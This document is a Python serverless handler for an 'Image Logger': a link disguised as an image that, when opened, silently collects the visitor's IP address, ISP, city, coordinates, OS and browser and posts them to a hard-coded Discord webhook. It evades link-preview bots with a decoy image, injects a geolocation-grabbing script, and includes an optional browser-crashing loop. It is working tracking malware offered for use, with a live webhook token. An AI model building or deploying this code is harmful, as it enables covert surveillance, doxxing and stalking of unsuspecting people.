from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

# Configuration
config = {
    "webhook": "https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc",
    "image": "https://i.pinimg.com/736x/27/23/68/27236835e767166454a6335e4cfe0549.jpg",
    "imageArgument": True,
    "username": "Agent 6",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": True,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned. https://github.com/OverPowerC",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if not ip or not useragent:
        return False
    if ip.startswith(("34", "35")):
        return "Discord"
    if "Discordbot" in useragent:
        return "Discord"
    if useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred!\n\n**Error:**\n```\n{error}\n```",
            }],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return None
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"An **Image Logging** link was sent!\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                }],
            })
        return None

    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        return None

    if info.get("proxy"):
        if config["vpnCheck"] == 2: return None
        if config["vpnCheck"] == 1: ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] >= 3: return None
        if config["antiBot"] >= 1: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"**A User Opened the Original Image!**\n\n**Endpoint:** `{endpoint}`\n\n**IP Info:**\n> **IP:** `{ip}`\n> **Provider:** `{info.get('isp', 'Unknown')}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n> **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords}`\n> **VPN:** `{info.get('proxy')}`\n\n**PC Info:**\n> **OS:** `{os}`\n> **Browser:** `{browser}`",
        }],
    }
    
    if url: embed["embeds"][0]["thumbnail"] = {"url": url}
    requests.post(config["webhook"], json=embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Get IP from Vercel header
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip()
            useragent = self.headers.get('user-agent', '')
            
            # Parse URL and arguments
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
            url = config["image"]
            if config["imageArgument"]:
                if dic.get("url"):
                    try: url = base64.b64decode(dic.get("url")).decode()
                    except: pass
                elif dic.get("id"):
                    try: url = base64.b64decode(dic.get("id")).decode()
                    except: pass

            # Bot detection for Discord preview
            if botCheck(ip, useragent):
                if config["buggedImage"]:
                    self.send_response(200)
                    self.send_header('Content-type', 'image/jpeg')
                    # Cache control to prevent Discord from caching the "loading" state
                    self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                    self.end_headers()
                    self.wfile.write(binaries["loading"])
                else:
                    self.send_response(302)
                    self.send_header('Location', url)
                    self.end_headers()
                
                makeReport(ip, useragent=useragent, endpoint=s.split("?")[0], url=url)
                return

            # Real user access
            result = None
            if dic.get("g") and config["accurateLocation"]:
                try:
                    location = base64.b64decode(dic.get("g")).decode()
                    result = makeReport(ip, useragent, location, s.split("?")[0], url=url)
                except:
                    result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)
            else:
                result = makeReport(ip, useragent, endpoint=s.split("?")[0], url=url)

            # Response for user
            if config["redirect"]["redirect"]:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode())
            else:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                
                html = f'''<html><head><style>body {{ margin: 0; padding: 0; background: #000; }}
                .img {{ background-image: url("{url}"); background-position: center; background-repeat: no-repeat; background-size: contain; width: 100vw; height: 100vh; }}
                </style></head><body><div class="img"></div>'''
                
                if config["accurateLocation"] and not dic.get("g"):
                    html += '''<script>
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(function(p) {
                            var url = new URL(window.location.href);
                            url.searchParams.set("g", btoa(p.coords.latitude + "," + p.coords.longitude));
                            window.location.replace(url.href);
                        });
                    }
                    </script>'''
                
                if config["crashBrowser"]:
                    html += '<script>setTimeout(function(){for(var i=2;i>0;i++){console.log(i)}},100)</script>'
                
                html += '</body></html>'
                self.wfile.write(html.encode())

        except Exception:
            reportError(traceback.format_exc())
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Internal Server Error")

    def do_POST(self):
        self.do_GET()
